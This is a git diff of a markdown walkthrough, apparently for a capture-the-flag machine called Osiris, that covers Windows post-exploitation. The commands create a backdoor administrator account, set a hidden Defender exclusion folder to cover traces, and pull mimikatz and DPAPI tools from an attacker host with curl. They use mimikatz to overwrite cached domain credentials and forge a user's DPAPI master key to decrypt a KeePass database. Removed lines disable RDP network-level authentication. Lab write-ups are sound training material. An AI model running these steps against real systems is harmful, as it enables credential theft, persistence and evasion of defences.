@@ -1762,10 +1762,11 @@ Disable windows FW to permit login from our VPN:
 
 Create a local user as admininistrator:
 
-	net user support.it Pwd1234 /add
- 	net localgroup administrators support.it /add
+	net user support.it Pwd1234 /add; net localgroup administrators support.it /add
+ 	The command completed successfully.
+	The command completed successfully.
 	
-Then login to RDP with the newly created user. In case you got a message warning that another user is logged in, proceed to ask for the disconnection, alternative you can force and kill a user session as follows:
+Then login to RDP with the newly created user. In case you got a message warning that another user is logged, click yes and wait some times, you should get int. Alternative you can force and kill a user session as follows:
 
 	PS C:\users\chajoh\desktop> query user
 	query user
@@ -1773,12 +1774,12 @@ Then login to RDP with the newly created user. In case you got a message warning
 	 alcrez                                    1  Disc            2  7/9/2024 5:22 AM
 
 	PS C:\users\chajoh\desktop> logoff 1
-Once logged in as local administrator I managed to define a defender esclusion folder in:
+Eventually follows the first access configuration required steps for support.it user. Once logged in as local administrator I managed to define a defender esclusion folder in:
 
 	C:\Users\Public\support_tools
  Eventually you can hide the folder to cover a bit our traces. Then I downloaded into Osiris mimikatz:
 
- 	C:\Users\Public\support_tools>curl -O http://10.9.0.223:8000/mimikatz.exe
+ 	C:\Users\Public\support_tools> curl -O http://10.9.0.223:8000/mimikatz.exe
 
 Execute mimikatz and set the appropriate permissions:
 
@@ -1808,41 +1809,165 @@ Looking for cached credentials:
 
 Reset chajoh domain password (Note: don't specify the domain in the user value, since the machine is not registered to a domain)
 
-	mimikatz # lsadump::cache /user:chajoh /password:Password1234$ /kiwi
+	mimikatz # lsadump::cache /user:chajoh /password:Pwd1234$ /kiwi
  	> User cache replace mode !
 	  * user     : chajoh
-	  * password : Password1234$
-	  * ntlm     : a327efd8971f1856271d1f8199e98a60
-
+	  * password : Pwd1234$
+	  * ntlm     : 91b52a266727bbe24146d5059bbd879d
 	...
 	[NL$1 - 9/19/2020 1:38:15 AM]
 	RID       : 00000465 (1125)
 	User      : WINDCORP\chajoh
-	MsCacheV2 : d576dff437c340753deb41739f4528b5
+	MsCacheV2 : f52542bb7f50df1b7bb0fd0ef1778781
 	> User cache replace mode (2)!
-	  MsCacheV2 : a69d765df4fe97286b0f85bb3752f8a6
-	  Checksum  : 3c2d348c98bb867c213bdc5ff63387c1
+	  MsCacheV2 : d95dc1f0080f42e5edbdb4d259043610
+	  Checksum  : b9cdc68a3e0601a47aa281c25f584534
 	> OK!
+   	....
+
+Take note of the ntlm password value since we will need it later.
+
+## Not able to access to RDP using chajoh
+Now I  tried different strategies and commands to permit to chajoh to connect through RDP but I failed, so I decided to use this great windows feauture known as <b>runas</b>.
+
+
+Check if we can get a shell as chajoh (here use the domain indeed)
+
+	C:\Users\Public\support_tools> runas /user:windcorp\chajoh cmd
+	Enter the password for windcorp\chajoh:
+	Attempting to start cmd as user "windcorp\chajoh" ...
+
+ A new cmd shell should be opened:
+
+ 	C:\Windows\system32>whoami
+	windcorp\chajoh
+Inspect keepas configuration:
+
+	C:\Windows\system32>type C:\Users\chajoh\AppData\Roaming\KeePass\KeePass.config.xml | findstr User
+                <PreferUserConfiguration>false</PreferUserConfiguration>
+                        <Path>..\..\Users\chajoh\Documents\Database.kdbx</Path>
+                                        <Path>..\..\Users\chajoh\Documents\Database.kdbx</Path>
+                                        <Path>..\..\Users\chajoh\Documents\Database2.kdbx</Path>
+                        <Item>Database@..\..\Users\chajoh\Documents</Item>
+                        <Item>KeyFile@..\..\Users\chajoh\Documents</Item>
+                                <Type>UserName</Type>
+                <UserProfiles />
+                                <DatabasePath>..\..\Users\chajoh\Documents\Database.kdbx</DatabasePath>
+                                <UserAccount>true</UserAccount>
+                                <DatabasePath>..\..\Users\chajoh\Documents\Database2.kdbx</DatabasePath>
+                                <UserAccount>true</UserAccount>
+Since user account is enabled we can try to recover the DB using the backed up DAPI key extracred from RA --> link here.
+Let's first try to open Keepass as current user:
+
+	cd "C:\Program Files (x86)\KeePass Password Safe 2"
+ 	C:\Program Files (x86)\KeePass Password Safe 2> KeePass.exe 
+  We recive the following message if we try to opend the DB:
+	
  	...
- Add chajoh user to local administrator to permit RDP login:
+  	Failed to load the specified file.
+   	The composite key is invalid.
+    	...
+Since we changed the user password we invalidate here DPAPI key. This is the reasono why we tooked a backup from the server, since the backed up DPAPI key is used in these cases, to restore the user's one. 
+Download the certificate to Osiris:
 
-	net localgroup administrators WINDCORP\chajoh /add
- But I got an error:
- 	
-  	...
-	The trust relationship between this workstation and the primary domain failed.
-This means that the server is not joing a domain. At this point I allowed everyone to RDP:
+	C:\Users\Public\support_tools>curl -O http://10.9.1.47:8000/ra-dpapi-bk.pfx
 
-	net localgroup "remote desktop users" everyone /add
-	The command completed successfully.
+ We also need of this tool to regenerate the user's DPAPI master key. 
 
-In order to access RDP session without being authenticated before, we have to disable NLA. More information [here](https://www.portnox.com/cybersecurity-101/network-level-authentication-nla/#:~:text=level%20authentication%20remotely%3F-,What%20is%20network%20level%20authentication%20(NLA)%3F,remote%20desktop%20session%20is%20established.). We can use the following command (you can also proceed as illustrated in the previous article using the GUI):
+  	C:\Users\Public\support_tools>curl -O http://10.9.1.47:8000/CQMasterKeyAD.exe
 
-	C:\Windows\system32>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
-	The operation completed successfully.
+And one to search for DAPI master key:
 
+	C:\Users\Public\support_tools>curl -O http://10.9.1.47:8000/CQDPAPIBlobSearcher.exe
 
+We start using this tool to find the current chajoh DPAPI keys used by Keepass:
 
+	C:\Users\Public\support_tools>CQDPAPIBlobSearcher.exe -d="C:\Users\chajoh\AppData\Roaming" -r -o C:\Users\chajoh\blobdata
+	Scanning C:\Users\chajoh\AppData\Roaming\KeePass\KeePass.config.xml
+	Scanning C:\Users\chajoh\AppData\Roaming\KeePass\ProtectedUserKey.bin
+	Found 1 in c:\users\chajoh\appdata\roaming\keepass\protecteduserkey.bin
+	 mkguid:               a773eede-71b6-4d66-b4b8-437e01749caa
+	 flags:                0x0
+	 hashAlgo:             0x8004 (SHA1)
+	 cipherAlgo:           0x6603 (3DES)
+	 cipherText:
+	98 9A 82 53 43 24 EC E4 F7 F5 3A 0A 19 53 C6 89   ...SC$....:..S..
+	49 86 2B 18 F2 A2 01 C9 50 0E 0B 2B DC A4 1E 46   I.+.....P..+...F
+	C1 50 25 DC 99 B3 F7 3E B5 01 85 51 AB D9 C6 1D   .P%....>...Q....
+	EC 6A 9A B8 A6 98 93 DB 8A F8 6F 1B 17 E7 02 25   .j........o....%
+	64 95 95 8B CD 2C CD DB                           d....,..
+	...
+We are intersted in the <b>mkguid as found in c:\users\chajoh\appdata\roaming\keepass\protecteduserkey.bin</b>. Take notes of this value since we will use it to build the users master key DPAPI path, in the related command. 
 
+Now let's have a look at the parameters needed to regenerate a new  master DPAPI key for chajoh.
 
- 	
+  	C:\Users\chajoh>C:\Users\Public\support_tools\CQMasterKeyAD.exe
+	CQMasterKeyAD by Michal Grzegorzewski, mgrzeg@cqure.pl
+	
+	Paula, you've probably provided bad params. Take a deep breath and try again :)
+	Usage: CQMasterKeyAD /file /pfx /newhash
+	Available parameters:
+	      --pfx=VALUE            Path to the pfx file containing RSA private key
+	                               (DPAPI Golden Key).
+	      --file=VALUE           Path to the Masterkey file.
+	      --newhash=VALUE        MD4 or SHA1 (but the same algo as for oldhash!)
+	                               for new masterkey. In AD environment and domain
+	                               accounts most probably MD4, in standalone: SHA1.
+
+So the whole command is:
+
+	C:\Users\Public\support_tools>CQMasterKeyAD.exe --pfx="C:\Users\Public\support_tools\ra-dpapi-bk.pfx" --file="C:\Users\chajoh\AppData\Roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" --newhash=91b52a266727bbe24146d5059bbd879d
+	New masterkey file successfully written to: C:\Users\chajoh\AppData\Roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa.admodified
+	Now swap the old masterkey file with the new one and set the system and hidden attributes, see example:
+	attrib "C:\Users\chajoh\AppData\Roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" +S +H
+	
+Now switch to powershell and proceed to rename swap the old key with the newly created:
+
+	cd C:\Users\chajoh\AppData\Roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125
+	PS C:\Users\chajoh\AppData\Roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125> ls -force
+   	
+	
+	Mode                 LastWriteTime         Length Name
+	----                 -------------         ------ ----
+	-a-hs-         7/10/2024   6:11 AM            740 72a4957a-3ece-4640-ab40-d3a49f589537
+	-a-hs-         9/12/2020   4:13 AM            740 a773eede-71b6-4d66-b4b8-437e01749caa
+	-a----         7/10/2024   6:11 AM            740 a773eede-71b6-4d66-b4b8-437e01749caa.admodified
+	-a-hs-         9/11/2020  11:42 AM            908 BK-WINDCORP
+	-a-hs-         7/10/2024   6:11 AM             24 Preferred
+
+Rename the current DPAPI key to old:
+
+	mv .\a773eede-71b6-4d66-b4b8-437e01749caa .\a773eede-71b6-4d66-b4b8-437e01749caa.old
+
+Rename the new created master kay according:
+
+	mv .\a773eede-71b6-4d66-b4b8-437e01749caa.admodified .\a773eede-71b6-4d66-b4b8-437e01749caa
+
+Last dont forget to restore the original attributes:
+
+ 	attrib.exe .\a773eede-71b6-4d66-b4b8-437e01749caa.admodified +S +H
+Let's check it out:
+	
+ 	ls -force
+	Directory: C:\Users\chajoh\AppData\Roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125
+
+	Mode                 LastWriteTime         Length Name
+	----                 -------------         ------ ----
+	...
+	-a-hs-         7/10/2024   6:11 AM            740 a773eede-71b6-4d66-b4b8-437e01749caa
+	-a-hs-         9/12/2020   4:13 AM            740 a773eede-71b6-4d66-b4b8-437e01749caa.old
+ 	...
+
+Now we should be able to open the Keepass DB:
+
+	C:\Program Files (x86)\KeePass Password Safe 2>KeePass.exe
+
+## Additional note. 
+In case you find that the Keepass master key value is different from:
+
+	c:\users\chajoh\appdata\roaming\keepass\protecteduserkey.bin
+	 mkguid:               a773eede-71b6-4d66-b4b8-437e01749caa
+It means that you have messed up something, It happened to me since I opened the Keepass DB using a different user (support.it), actually it is not clear to me what exactly happened, in this case, I'm sorry, but you have to restart Osiris.
+
+	
+	
